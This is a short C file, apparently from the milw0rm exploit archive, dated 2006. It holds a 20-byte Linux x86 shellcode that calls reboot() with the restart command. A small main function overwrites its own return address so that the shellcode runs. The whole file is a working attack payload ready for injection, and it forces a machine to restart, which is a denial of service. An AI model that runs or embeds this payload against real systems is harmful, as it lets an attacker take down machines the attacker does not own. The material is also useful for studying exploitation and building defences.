/*
 * (linux/x86) reboot(LINUX_REBOOT_MAGIC1, LINUX_REBOOT_MAGIC2, LINUX_REBOOT_CMD_RESTART) - 20 bytes
 * - izik <izik@tty64.org>
 */

char shellcode[] =

	"\x6a\x58"              // push $0x58
	"\x58"                  // pop %eax
	"\xbb\xad\xde\xe1\xfe"  // mov $0xfee1dead,%ebx
	"\xb9\x69\x19\x12\x28"  // mov $0x28121969,%ecx
	"\xba\x67\x45\x23\x01"  // mov $0x1234567,%edx
	"\xcd\x80";             // int $0x80

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}

// milw0rm.com [2006-01-21]